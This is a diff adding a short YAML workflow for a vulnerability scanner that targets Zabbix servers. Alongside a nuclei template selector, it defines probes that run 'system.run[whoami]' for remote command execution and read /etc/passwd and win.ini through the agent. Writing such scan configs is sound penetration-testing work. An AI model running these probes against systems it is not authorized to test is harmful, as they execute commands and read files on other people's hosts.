@@ -1,0 +1,26 @@
+type: workflow
+name: zabbix
+alias: zabbix
+description: Zabbix vulnerability scan
+long_description: |
+  Scans Zabbix vulnerabilities using specialized tools.
+tags: [http, zabbix, vuln]
+input_types:
+  - ip
+  - host
+  - host:port
+
+tasks:
+  _group:
+    nuclei/zabbix:
+      description: Detect Zabbix vulnerabilities
+      template_condition: "contains(id, 'zabbix') || contains(tags, 'zabbix')"
+
+    zabbix_get/rce:
+      key: "system.run[whoami]"
+
+    zabbix_get/lfi_linux:
+      key: "vfs.file.contents[/etc/passwd]"
+
+    zabbix_get/lfi_windows:
+      key: "vfs.file.contents[C:\\Windows\\win.ini]"
